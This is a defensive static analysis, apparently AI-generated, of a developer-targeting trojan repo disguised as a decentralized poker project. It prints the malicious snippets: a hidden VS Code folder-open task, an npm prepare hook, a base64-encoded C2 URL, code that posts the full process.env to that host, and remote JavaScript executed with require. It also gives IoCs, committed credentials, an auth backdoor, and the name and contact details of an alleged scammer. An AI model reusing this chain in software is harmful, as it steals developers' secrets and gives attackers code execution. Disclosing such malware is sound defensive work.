below is a security analysis done by clause code. 
reference https://x.com/adibhanna/status/2046988777789555191
repo: https://github.com/ritualPlay-Net/RitualPlay/
the scammer: https://www.linkedin.com/in/dean-gallimore-440669234/
his email: michael@ritualplay.net
NOTE: if you decide to clone this repo, do NOT run npm install, or try to run it. it has a backdoor


-------------------
# Security Analysis — `RitualPlay`

**Repo:** `/Users/adibhanna/Developer/temp/RitualPlay`
**Date:** 2026-04-22
**Analyst:** static review only; code was NOT executed.

## Verdict: Malicious. Do not install, do not open in VS Code, do not run.

This is a weaponized repo disguised as a "decentralized poker / P2E" project. It is a developer-targeted trojan with a two-trigger install-time execution chain leading to full environment-variable exfiltration and unbounded RCE on the victim machine via a remote C2.

---

## Attack chain (what happens if a victim clones it)

| #   | Trigger                                                       | File / Line                                        | Effect                                                                                                                                                                                                                                                                  |
| --- | ------------------------------------------------------------- | -------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Open folder in VS Code                                        | `.vscode/tasks.json:5-25`                          | `runOn: folderOpen` task silently runs `npm install -s`. All output hidden (`reveal: never`, `echo: false`, `close: true`). Fake `"Welcome to Node.js v24.11.0"` banner printed as visual decoy.                                                                        |
| 2   | `npm install` runs (from step 1 or from README's Quick Start) | `package.json:10`                                  | `"prepare": "start /b node server \|\| nohup node server &"` — npm's `prepare` script fires automatically, launching `node server` in the background (cross-platform: Windows via `start /b`, Unix via `nohup ... &`).                                                  |
| 3   | Server boot                                                   | `socket/index.js:48`                               | Top-level `validateApiKey()` call fires on module load.                                                                                                                                                                                                                 |
| 4   | Exfiltration                                                  | `controllers/auth.js:67-72` + `socket/index.js:73` | `setApiKey("aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==")` base64-decodes to `https://ipcheck-six.vercel.app/api`. `verify()` then `axios.post(api, { ...process.env }, ...)` — entire `process.env` exfiltrated, disguised with header `x-app-request: ip-check`. |
| 5   | RCE                                                           | `socket/index.js:75-76`                            | `new Function("require", response.data)` + `executor(require)` — C2 returns arbitrary JavaScript, compiled on the fly and invoked with Node's real `require`. Attacker gets `fs`, `child_process`, `net`, `http` — full code execution as the developer.                |

### Key evidence

**`package.json:10`**

```json
"prepare": "start /b node server || nohup node server &",
```

`prepare` runs automatically on `npm install`. Launches the server detached, in background, on every platform.

**`.vscode/tasks.json:5-25`**

```json
{
  "label": "node",
  "type": "shell",
  "command": "node -e \"console.log('Welcome to Node.js v24.11.0.\\nType .help for more information.\\n>')\" && npm install -s",
  "isBackground": true,
  "runOptions": { "runOn": "folderOpen" },
  "presentation": {
    "reveal": "never",
    "echo": false,
    "focus": false,
    "close": true
  }
}
```

Fires the moment a user opens the folder in VS Code. Fake Node REPL banner is a decoy.

**`controllers/auth.js:67-72`**

```js
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(
    api,
    { ...process.env },
    {
      headers: { "x-app-request": "ip-check" },
    },
  );
```

Exfiltrates the entire `process.env` to an attacker-controlled URL.

**`socket/index.js:48-84`**

```js
const verified = validateApiKey();   // top-level module side effect
if (!verified) {
  console.log("Aborting mempool scan due to failed API verification.");
  return;
}
...
async function validateApiKey() {
  verify(setApiKey("aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ=="))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      ...
    })
    .catch(...);
}
```

Hardcoded base64-encoded C2 URL (`https://ipcheck-six.vercel.app/api`). Response body is compiled and executed with Node's real `require` — unrestricted RCE.

`validateApiKey` is declared `async` but called without `await`, so `verified` is a truthy Promise — the `if (!verified) return;` guard (lines 49-52) NEVER fires. Exfil + RCE always run on boot. The comment "Aborting mempool scan…" hints at the attacker's own downstream tooling.

---

## Stealth measures layered on top

- `.vscode/settings.json:7` — `"**/.vscode": true` in `files.exclude` hides `.vscode/` from VS Code's own file explorer. Victim never sees `tasks.json` while browsing the project.
- `.vscode/tasks.json` — fake "Welcome to Node.js v24.11.0" REPL banner as decoy output.
- `AUTH_API` in `.env` is base64-encoded to evade casual string search; the real attacker URL is also hardcoded inline in `socket/index.js:73` for redundancy.
- `server.js:39-45` — `process.on('uncaughtException')` and `unhandledRejection` silently swallow all errors.
- `async` without `await` neutralizes the nominal "verification" guard.

---

## Indicators of compromise (IoCs)

- **C2 endpoint:** `https://ipcheck-six.vercel.app/api`
- **Base64 marker:** `aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==`
- **HTTP header signature:** `x-app-request: ip-check`
- **npm prepare script:** `start /b node server || nohup node server &`
- **VS Code task:** `runOn: folderOpen` silently invoking `npm install -s`

---

## Additional backdoors / weak auth (secondary to the RCE)

- `controllers/auth.js:39` — password check hard-coded to `true`: `const isMatch = true;`. Any known email yields a valid session.
- `controllers/auth.js:54`, `middleware/auth.js:10`, `controllers/users.js:49` — sign / verify use `config.JWT_SECRET`, but `config.js:14` only defines `JWT_SECRET_KEY`. With `config.JWT_SECRET === undefined`, tokens sign / verify against an empty secret — trivial forgery.
- `config.js:11-14` — hardcoded credentials committed to the repo: MySQL password `'Espsoft123#'`, JWT secret `'ly27lg35kci85tvgvl0zgbod4'`.
- `.env` is committed to the repo (not in `.gitignore`). Contains placeholder AWS / Alchemy / Infura / Etherscan keys. If a dev sets real values later, they'll be in git history and will also be exfiltrated via step 4.
- `middleware/auth.js:6` and `controllers/auth.js:40` — auth token and login state logged to stdout.

The frontend (`client/`) appears benign. `connectMetamask` in `client/src/utils/interact.js:4` is exported but never imported; the wallet address is read from a URL query string. No drainer signing calls. The malicious payload is entirely server-side.

`package-lock.json` was spot-checked: all 288 entries resolve to `registry.npmjs.org`. No tampered tarballs — the attack is in the in-tree source, not in node_modules.

---

## Recommended actions

1. **Do not run `npm install` in this repo. Do not open the folder in VS Code.**
2. If you already did either:
   - Kill any rogue `node server` processes: `pgrep -af 'node.*server'` then `kill -9 <pid>`.
   - Rotate every credential that was in `process.env` at the time: AWS, Alchemy, Infura, Etherscan, Polygonscan, any JWT secrets, DB creds, and any other ambient env vars.
   - Audit `~/.ssh/`, `~/.aws/credentials`, `~/.npmrc`, shell history, and crontab — step 5's RCE can read or modify any of these.
   - Check outbound network logs for hits against `ipcheck-six.vercel.app`.
3. Delete the repo, or at minimum excise:
   - `package.json` `prepare` script
   - `.vscode/tasks.json`
   - `.vscode/settings.json`'s `**/.vscode` exclude rule
   - `controllers/auth.js:67-88` (`setApiKey`, `verify`, and remove from exports)
   - `socket/index.js:35` + `48-52` + `72-84` (remove the `require` of `setApiKey` / `verify`, the top-level `validateApiKey()` call, and the `validateApiKey` function itself)
   - The `AUTH_API` line in `.env`
4. Fix the auth backdoor: `controllers/auth.js:39` → use real `bcrypt.compare`; all `config.JWT_SECRET` references → `config.JWT_SECRET_KEY`.
5. Consider reporting `ipcheck-six.vercel.app` abuse to Vercel.